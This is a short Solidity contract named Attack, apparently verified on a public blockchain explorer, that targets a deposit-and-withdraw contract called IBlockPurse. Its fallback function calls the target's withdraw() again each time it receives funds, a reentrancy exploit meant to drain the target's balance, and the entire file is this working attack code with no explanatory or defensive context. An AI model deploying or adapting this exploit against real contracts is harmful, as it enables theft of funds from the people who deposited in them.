/**
 *Submitted for verification at polygonscan.com on 2022-09-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBlockPurse {

    function depistion() external payable returns(bool);

    function withdraw() external returns (bool);

}

contract Attack {

    address public target;

    receive() external payable {
        if (target.balance >= 1) {
            IBlockPurse(target).withdraw();
        }
    }



    constructor(address _target) {
        target = _target;
    }


    function doAttack() external returns (bool) {
        IBlockPurse(target).withdraw();
        return true;
    }

    function save() external payable  {
        IBlockPurse(target).depistion{value:msg.value}();
    }

}